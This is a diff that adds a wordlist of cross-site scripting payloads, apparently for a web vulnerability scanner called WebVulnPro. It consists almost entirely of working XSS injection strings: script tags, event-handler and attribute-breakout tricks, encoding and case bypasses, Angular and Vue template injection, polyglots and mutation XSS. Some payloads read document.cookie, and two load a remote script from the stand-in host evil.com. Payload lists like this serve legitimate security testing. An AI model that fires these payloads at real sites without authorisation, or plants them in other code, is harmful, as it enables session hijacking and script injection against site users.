@@ -1,0 +1,210 @@
+# WebVulnPro XSS Payload Wordlist
+# For testing reflected XSS vulnerabilities
+# These are safe test payloads - they trigger alerts but cause no harm
+
+# Basic script injection
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+# Event handlers - img
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img src="x" onerror="alert(1)">
+<img/src=x onerror=alert(1)>
+<img src=1 onerror=alert(1)>
+<img src=x:x onerror=alert(1)>
+
+# Event handlers - svg
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload="alert(1)">
+<svg/onload="alert(1)">
+<svg><script>alert(1)</script></svg>
+
+# Event handlers - body
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+
+# Event handlers - input
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<input value=x onclick=alert(1)>
+
+# Event handlers - details
+<details open ontoggle=alert(1)>
+<details/open/ontoggle=alert(1)>
+
+# Event handlers - marquee
+<marquee onstart=alert(1)>
+<marquee onfinish=alert(1)>
+<marquee onbounce=alert(1)>
+
+# Event handlers - video/audio
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<audio onerror=alert(1)><source src=x>
+
+# Object and embed
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<embed code=javascript:alert(1)>
+
+# Iframe
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe onload=alert(1)>
+
+# Breaking out of attributes
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+
+# Breaking out of JavaScript
+'-alert(1)-'
+"-alert(1)-"
+';alert(1)//
+";alert(1)//
+\';alert(1)//
+\";alert(1)//
+</script><script>alert(1)</script>
+
+# HTML entity encoding bypass
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+
+# Case variation
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+<SVG ONLOAD=alert(1)>
+
+# Null bytes and special chars
+<scr\0ipt>alert(1)</scr\0ipt>
+<script>al\u0065rt(1)</script>
+<img src=x onerror=\u0061lert(1)>
+
+# JavaScript protocol
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:alert(document.domain)
+java\nscript:alert(1)
+java\rscript:alert(1)
+java\tscript:alert(1)
+
+# Data URI
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Expression (legacy IE)
+<div style="width:expression(alert(1))">
+
+# Behavior (legacy IE)
+<div style="behavior:url(evil.htc)">
+
+# XSS in href
+<a href=javascript:alert(1)>Click</a>
+<a href="javascript:alert(1)">Click</a>
+<a href='javascript:alert(1)'>Click</a>
+
+# XSS in action
+<form action=javascript:alert(1)><input type=submit>
+<form><button formaction=javascript:alert(1)>Click</button></form>
+
+# XSS in src
+<script src=//evil.com/xss.js></script>
+<script src="//evil.com/xss.js"></script>
+
+# DOM based
+<img src=x id=x onfocus=alert(1)>
+#<img src=x onerror=alert(1)>
+<img src=x onerror=alert(location.hash)>
+
+# Template injection
+{{alert(1)}}
+${alert(1)}
+#{alert(1)}
+[[alert(1)]]
+
+# Angular specific
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+
+# Vue.js specific
+{{_c.constructor('alert(1)')()}}
+
+# Polyglot payloads
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Mutation XSS
+<noscript><p title="</noscript><script>alert(1)</script>">
+
+# SVG variations
+<svg><animatetransform onbegin=alert(1)>
+<svg><animate onbegin=alert(1)>
+<svg><set onbegin=alert(1)>
+<svg><handler xmlns:ev=http://www.w3.org/2001/xml-events ev:event=load onload=alert(1)>
+
+# Less common tags
+<isindex action=javascript:alert(1)>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<keygen onfocus=alert(1) autofocus>
+<meter onmouseover=alert(1)>0</meter>
+
+# URL encoding
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+%3Csvg%20onload=alert(1)%3E
+
+# Double URL encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# Unicode encoding
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\x3cscript\x3ealert(1)\x3c/script\x3e
+
+# HTML5 events
+<body onscroll=alert(1)><div style="height:1000px"></div>
+<body ontouchstart=alert(1)>
+<body ontouchmove=alert(1)>
+<body ontouchend=alert(1)>
+
+# Textarea escape
+</textarea><script>alert(1)</script>
+
+# Style tag escape
+</style><script>alert(1)</script>
+
+# Title tag escape
+</title><script>alert(1)</script>
+
+# Script data escape
+</script><script>alert(1)</script>
+
+# SVG in namespace
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+
+# MathML
+<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction></math>
+
+# Obfuscated
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+# With comments
+<script>/**/alert(1)/**/</script>
+<script>// comment\nalert(1)</script>
+
+# Newline variations
+<script
+>alert(1)</script>
+<script >alert(1)</script >
+<script	>alert(1)</script	>
